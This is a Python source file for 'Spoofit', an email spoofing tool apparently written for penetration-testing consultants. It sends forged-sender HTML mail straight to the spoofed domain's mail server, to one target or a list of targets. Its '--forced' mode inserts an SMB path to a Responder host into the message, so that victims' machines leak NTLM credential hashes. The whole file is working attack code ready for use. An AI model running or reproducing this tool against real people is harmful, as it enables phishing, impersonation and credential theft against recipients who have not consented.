import smtplib
import dns.resolver
import argparse
import os
import configparser

def print_banner():
    banner = """
   _____                   _____ __ 
  / ___/____  ____  ____  / __(_) /_
  \__ \/ __ \/ __ \/ __ \/ /_/ / __/
 ___/ / /_/ / /_/ / /_/ / __/ / /_  
/____/ .___/\____/\____/_/ /_/\__/  
    /_/                             
  by: Matt Millen and his best bud.   
   """
    print(banner)

def get_domain_from_email(email):
    return email.split('@')[1]

def get_mx_record(domain):
    try:
        answers = dns.resolver.resolve(domain, 'MX')
        mx_record = min(answers, key=lambda r: r.preference).exchange.to_text()
        return mx_record
    except Exception as e:
        print(f"[!] Error retrieving MX record: {e}")
        return None

def send_email(mx_record, sender, recipient, subject, body):
    try:
        with smtplib.SMTP(mx_record, 25) as server:
            server.ehlo_or_helo_if_needed()
            server.mail(sender)
            code, msg = server.rcpt(recipient)
            if code != 250:
                print(f"[!] Failed to send email to {recipient}: {msg}")
                return
            server.data(f"To: {recipient}\r\nFrom: {sender}\r\nSubject: {subject}\r\nContent-Type: text/html\r\n\r\n{body}")
            print(f"[+] Email sent to {recipient}")
    except smtplib.SMTPRecipientsRefused:
        print(f"[!] Recipient refused: {recipient}")
    except smtplib.SMTPException as e:
        print(f"[!] Error sending email to {recipient}: {e}")

def load_config(forced=False):
    config = configparser.ConfigParser()
    config_file = 'conf/spoofit.conf'
    
    if not os.path.exists(config_file):
        print(f"[!] Configuration file {config_file} does not exist.")
        return None

    config.read(config_file)
    
    if forced:
        subject = config.get('ForcedAuthEmail', 'subject')
        body_file = config.get('ForcedAuthEmail', 'body_file')
        with open(body_file, 'r') as file:
            body = file.read()
    else:
        subject = config.get('Email', 'subject')
        body = config.get('Email', 'body')
    
    if "<consultant-name>" in body or "<consultant-email>" in body:
        print("[!] Hold up... you still need to modify conf/spoofit.conf to include your name and Converge email first....")
        return None

    return subject, body

def create_forced_auth_email(body_template, responder_ip):
    return body_template % {'responder': responder_ip}

def main():
    print_banner()

    parser = argparse.ArgumentParser(description="Email Spoofing Tool")
    parser.add_argument('-s', '--sender', required=True, help='Email address to use as the spoofed sender')
    parser.add_argument('-r', '--recipients', required=True, help='Recipient email address or file containing multiple addresses')
    parser.add_argument('-f', '--forced', help='Optional: Forced authentication email with responder IP')

    args = parser.parse_args()

    # Determine if recipients is a file or a single email
    recipients = []
    if os.path.isfile(args.recipients):
        with open(args.recipients, 'r') as f:
            recipients = [line.strip() for line in f if line.strip()]
    else:
        recipients.append(args.recipients)

    if args.forced:
        config_result = load_config(forced=True)
        if config_result is None:
            return

        email_subject, body_template = config_result
        email_body = create_forced_auth_email(body_template, args.forced)
        print(f"[*] Sending forced authentication email to {len(recipients)} target{'s' if len(recipients) > 1 else ''} with SMB path to {args.forced}.")
    else:
        config_result = load_config()
        if config_result is None:
            return

        email_subject, email_body = config_result
        print(f"...Sending spoofed email to {len(recipients)} target{'s' if len(recipients) > 1 else ''}.")

    # Extract domain from sender's email
    domain = get_domain_from_email(args.sender)

    # Get the MX record for the domain
    mx_record = get_mx_record(domain)
    if not mx_record:
        print("Failed to retrieve MX record. Exiting...")
        return

    # Send emails to each recipient
    for recipient in recipients:
        send_email(mx_record, args.sender, recipient, email_subject, email_body)

if __name__ == "__main__":
    main()
